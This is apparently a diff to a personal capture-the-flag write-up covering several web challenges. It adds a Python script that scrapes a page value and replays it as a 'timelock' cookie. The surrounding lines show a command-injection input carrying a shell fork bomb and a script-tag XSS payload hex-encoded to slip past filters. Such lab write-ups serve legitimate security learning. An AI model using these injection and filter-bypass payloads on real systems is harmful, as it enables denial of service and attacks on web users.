@@ -355,6 +355,34 @@ s.close()
 C08
 Hand to inject: cryptonite -n; :(){ :|:& };: (fork bomb)
 
+C10
+
+This took me a little longer than it should have...I forgot to put the actual name of the cookie (timelock) in the code until much later:
+
+```python
+import requests
+from bs4 import BeautifulSoup
+
+# Fetch the HTML source
+url = 'https://bulldoghax.com/secret/spinner'
+response = requests.get(url)
+htmlsource = response.text
+
+# Use BeautifulSoup to extract the 'cookie' from the div with class 'number'
+soup = BeautifulSoup(htmlsource, 'html.parser')
+cookie = soup.find('div', {'class': 'number'}).text
+print(cookie)
+
+# Create a dictionary with the 'cookie' to send as a cookie in the POST request
+cookies = {'timelock': cookie}  # Replace 'cookie_name' with the actual cookie name
+
+# Make the POST request with the 'cookie'
+
+post_url = 'https://bulldoghax.com/secret/codes'
+response = requests.post(post_url, cookies=cookies)
+# Print the response content
+print(response.text)
+```
 C11
 This one again took longer than it should have. I needed to insert this payload into the search box: <script>alert('Search this!!!')</script> but there were filters in place. I finally figured out to encode it with Hex(ascii) and then insert it, which gave me the flag.
 
